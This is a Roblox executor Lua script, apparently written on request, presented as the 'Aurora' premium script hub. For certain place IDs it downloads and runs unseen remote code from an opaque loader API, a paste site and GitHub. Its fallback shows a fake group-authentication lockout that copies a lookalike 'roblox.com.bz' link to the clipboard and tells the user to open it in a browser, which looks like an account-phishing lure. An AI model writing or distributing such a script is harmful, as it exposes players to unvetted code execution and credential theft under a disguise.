-- Full Lua script for Roblox executor, as requested.
-- Handles place-specific loads and fallback UI if no place ID matches.

task.spawn(function()
    local placeId = game.PlaceId

    if placeId == 920587237 then
        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL2Fkb3B0bWUubHVhIn19"))()
        return
    end

    if placeId == 142823291 then
        local function ui()
            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5K71vvSZ2h/0", true))()
        end
        local function farm()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/realvis/refs/heads/main/visuals.lua"))()
        end
        task.spawn(ui)
        task.spawn(farm)
        return
    end

    if placeId == 97598239454123 then
        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
        return
    end

    -- Fallback: no matching placeId, execute the Fluent UI block.
    local Fluent
    local success, err = pcall(function()
        Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
    end)

    if not success or not Fluent then
        warn("Aurora: Failed to load UI library. Retrying...")
        task.wait(1)
        Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
    end

    local GroupID = 67
    local GroupLink = "https://roblox.com.bz/communities/291271763/"

    Fluent:Notify({
        Title = "Aurora Authentication",
        Content = "Oops looks like your not in the group",
        Duration = 2
    })

    task.wait(1)

    local Window = Fluent:CreateWindow({
        Title = "Aurora",
        SubTitle = "Premium Build",
        TabWidth = 160,
        Size = UDim2.fromOffset(480, 320),
        Acrylic = true,
        Theme = "Dark",
        MinimizeKey = Enum.KeyCode.LeftControl
    })

    local Tabs = {
        Auth = Window:AddTab({ Title = "Authentication", Icon = "shield-check" }),
        Instructions = Window:AddTab({ Title = "Instructions", Icon = "info" })
    }

    Tabs.Auth:AddParagraph({
        Title = "Access Locked",
        Content = "This Scripthub requires you to join our group to access the rest of the script"
    })

    Tabs.Auth:AddButton({
        Title = "Copy Access Link",
        Description = "Copies the group URL to your clipboard",
        Callback = function()
            if setclipboard then
                setclipboard(GroupLink)
                Fluent:Notify({ Title = "Aurora", Content = "Access Link copied!", Duration = 2 })
            else
                Fluent:Notify({ Title = "Aurora", Content = "Clipboard not supported", Duration = 2 })
            end
        end
    })

    Tabs.Instructions:AddParagraph({
        Title = "1. Open Browser",
        Content = "Open your preferred web browser on your device"
    })

    Tabs.Instructions:AddParagraph({
        Title = "2. Paste Link",
        Content = "Paste the link you copied from the Authentication tab into the URL bar"
    })

    Tabs.Instructions:AddParagraph({
        Title = "3. Final Step",
        Content = "Join the group to verify membership"
    })
end)
